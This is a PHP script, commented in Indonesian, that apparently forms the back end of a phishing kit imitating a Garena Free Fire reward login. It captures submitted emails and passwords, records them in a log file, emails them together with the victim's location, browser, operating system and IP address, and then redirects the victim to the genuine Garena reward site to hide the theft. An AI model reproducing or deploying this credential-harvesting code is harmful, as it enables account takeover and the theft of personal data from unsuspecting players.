<?php
// MENGAMBIL KONTROL
include 'config/result.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == ""){
header("Location: index.php");
}else{
	$file_lines = file('config/rndylogin.txt');
	foreach ($file_lines as $file => $value) {
		$data = explode("|", $value);
		if (in_array($email, $data)) {
			header('location: index.php');
		} else {
			$myfile = fopen("config/rndylogin.txt", "a") or die("Unable to open file!");
			$txt = $email;
			if(fwrite($myfile, "|". $txt)) {
//KONTEN UNTUK KIRIM KE EMAIL
$subjek = "$rndytech | $email | $device | LOGIN $login";
$pesan = '
   <center>
   <div style="border:2px solid #c21500;border-bottom:none;width: 294; font-weight:bold; height: 20px; background: linear-gradient(to right, #ec6f66, #f3a183); color: #fff; padding:8px 0; text-align:center;">
 ACCOUNT INFORMATION</div>
    <table border="1" bordercolor="#b993d6" width="100%" style="color:#fff; border:2px solid #c21500; border-collapse:collapse;background: linear-gradient(to right, #f2709c, #ff9472);">
       <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telepon</b></th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$email.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$password.'</th> 
   </tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Login</th>
   <th style="width: 65%; text-align: center;"><b>'.$login.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Negara</th>
   <th style="width: 65%; text-align: center;"><b>'.$negara.'</th> 
   </tr>
      <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Provinsi</th>
   <th style="width: 65%; text-align: center;"><b>'.$provinsi.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>koKa</th>
   <th style="width: 65%; text-align: center;"><b>'.$kota.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nickname</th>
   <th style="width: 65%; text-align: center;"><b>'.$os.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Elite Pass</th>
   <th style="width: 65%; text-align: center;"><b>'.$browser.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Tier</th>
   <th style="width: 65%; text-align: center;"><b>'.$viewip.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date</th>
   <th style="width: 65%; text-align: center;"><b>'.$time.'</th> 
   </tr>
   </table> 
   <div style="border:2px solid #c21500;border-top:none;width: 294; font-weight:bold; height: 20px; background: linear-gradient(to right, #ec6f66, #f3a183); color: #fff; padding: 10px 0; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
   </div>
    <center>
   ';
include'config/garena.php';
include 'email.php';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($email, $subjek, $pesan, $headers);
              include'assets/img/garena.jpg';        
if($kirim) {
echo '<script>window.location.replace("https://reward.ff.garena.com/")</script>';
}
}
}
}
}
?>